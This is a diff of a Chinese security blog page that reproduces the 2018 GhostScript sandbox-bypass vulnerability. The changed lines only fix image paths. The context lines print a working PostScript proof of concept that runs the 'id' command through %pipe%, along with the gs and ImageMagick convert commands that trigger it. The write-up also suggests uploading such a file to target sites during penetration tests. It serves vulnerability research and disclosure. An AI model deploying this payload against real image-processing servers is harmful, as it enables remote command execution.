@@ -14,13 +14,13 @@
 <meta property="og:site_name" content="回忆飘如雪">
 <meta property="og:description" content="一、漏洞信息   项目 描述    漏洞名称 GhostScript 沙箱绕过（命令执行）漏洞   漏洞作者 Tavis Ormandy   CVE编号 暂未分配   漏洞描述 攻击者利用此漏洞可以上传恶意构造的图像文件，当目标服务器在对图像进行裁剪、转换等处理时即会执行攻击者指定的命令。   影响范围 &amp;lt;= 9.23（全版本，全平台）   披露时间 2018-08-21   二、复现环境">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://gv7.me/.me//gs_read_passwd.png">
-<meta property="og:image" content="http://gv7.me/.me//imagemagic_convert.png">
+<meta property="og:image" content="http://gv7.me/articles/2018/ghostscript-rce-20180821/gs_read_passwd.png">
+<meta property="og:image" content="http://gv7.me/articles/2018/ghostscript-rce-20180821/imagemagic_convert.png">
 <meta property="og:updated_time" content="2019-02-16T18:06:25.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="GhostScript沙箱绕过命令执行漏洞复现">
 <meta name="twitter:description" content="一、漏洞信息   项目 描述    漏洞名称 GhostScript 沙箱绕过（命令执行）漏洞   漏洞作者 Tavis Ormandy   CVE编号 暂未分配   漏洞描述 攻击者利用此漏洞可以上传恶意构造的图像文件，当目标服务器在对图像进行裁剪、转换等处理时即会执行攻击者指定的命令。   影响范围 &amp;lt;= 9.23（全版本，全平台）   披露时间 2018-08-21   二、复现环境">
-<meta name="twitter:image" content="http://gv7.me/.me//gs_read_passwd.png">
+<meta name="twitter:image" content="http://gv7.me/articles/2018/ghostscript-rce-20180821/gs_read_passwd.png">
     
     
         
@@ -210,7 +210,7 @@
 <p>将以上poc保存为poc.ps文件，并执行以下命令。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gs -q -sDEVICE=ppmraw -dSAFER  poc.ps</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.me//gs_read_passwd.png" alt="图1-执行结果"></p>
+<p><img src="/articles/2018/ghostscript-rce-20180821/gs_read_passwd.png" alt="图1-执行结果"></p>
 <h4 id="4-2命令执行"><a href="#4-2命令执行" class="headerlink" title="4.2命令执行"></a>4.2命令执行</h4><p>ubuntu poc：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">save</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span><br><span class="line">restore</span><br><span class="line">mark /OutputFile (%pipe%id) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure>
 
@@ -220,7 +220,7 @@
 <p>这里我们是linux是Ubuntu发行版，故选择第一个poc进行测试。将以上poc保存为poc.jpg文件，并执行以下命令,测试对恶意图片文件进行格式转换。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/bin/convert poc.jpg poc.jpg</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.me//imagemagic_convert.png" alt="图2-执行结果"></p>
+<p><img src="/articles/2018/ghostscript-rce-20180821/imagemagic_convert.png" alt="图2-执行结果"></p>
 <p><strong>注意：</strong> 漏洞作者的<a href="http://seclists.org/oss-sec/2018/q3/142" target="_blank" rel="noopener">《More Ghostscript Issues: Should we disable PS coders in policy.xml by default?》</a>这篇文章里的convert命令不是ghostscript的，而是它的上游应用。可以是imagemagick，也可以是graphicsmagick。经过测试两个软件的convert命令都存在漏洞,我们这里复测的事imagemagick。</p>
 <h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>ghostscript的上游应用有imagemagick，libmagick，graphicsmagick，gimp，python-matplotlib，texlive-core，texmacs，latex2html，latex2rtf等，其中ImageMagick受该漏洞影响最为严重。有相当多的网站，博客，媒体平台和流行的CMS（WordPress，Drupal等）在使用ImageMagick来进行图像处理。 <strong>故在日常渗透测试中，可以上传带有dnslog测试的poc，来测试目标网站是否存在该漏洞。</strong></p>
 <h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
